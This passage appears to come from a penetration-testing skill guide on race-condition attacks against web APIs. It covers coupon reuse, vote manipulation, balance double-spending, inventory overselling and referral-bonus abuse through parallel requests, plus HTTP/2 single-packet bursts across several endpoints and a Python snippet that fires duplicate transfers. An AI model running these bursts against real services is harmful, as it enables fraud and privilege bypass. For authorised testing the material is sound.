### 11.1 Coupon / Promo Code Reuse

```text
Target:   POST /api/apply-coupon {"code":"SUMMER50"}
Expected: One use per user
Attack:   20 parallel identical requests
Evidence: Multiple 200 responses, final order total = N × discount applied
```

Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout).

### 11.2 Vote / Rating Manipulation

```text
Target:   POST /api/vote {"post_id":123,"direction":"up"}
Expected: One vote per user per post
Attack:   50 parallel vote requests
Evidence: Vote count += N, or DB shows multiple vote rows for same user+post
```

### 11.3 Balance Double-Spend

```text
Target:   POST /api/transfer {"to":"attacker","amount":100}
Balance:  Exactly 100
Attack:   2+ parallel transfers
Evidence: Both succeed, sender balance goes negative, recipient receives 200
```

Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult.

### 11.4 Inventory Oversell

```text
Target:   POST /api/purchase {"item_id":"limited_edition","qty":1}
Stock:    1 remaining
Attack:   20 parallel purchase requests
Evidence: Multiple orders created, stock counter goes negative
```

Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently.

### 11.5 Referral / Signup Bonus

```text
Target:   POST /api/referral/claim {"code":"REF_ABC"}
Expected: One claim per referred user
Attack:   Parallel claims from same session
Evidence: Bonus credited to referrer multiple times
```

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously.

### Pattern 1: State-check + State-mutate

```text
Single TCP segment:
  Stream 1: GET  /api/balance       ← probe pre-state
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← probe post-state
```

Balance inconsistency between stream 1 and stream 7 confirms the race window was hit.

### Pattern 2: Cross-resource race

```text
Single TCP segment:
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order
```

If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price.

### Pattern 3: Auth verification + Privileged action

```text
Single TCP segment:
  Stream 1: POST /api/email/verify?token=TOKEN  ← verify email
  Stream 3: POST /api/account/upgrade            ← requires verified email
```

Upgrade may succeed during the brief window where verification is processing but not yet committed.

### Practical setup

Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## Related

- **business-logic-vulnerabilities** — workflow, coupon abuse, and logic-first checklists (`../business-logic-vulnerabilities/SKILL.md`).
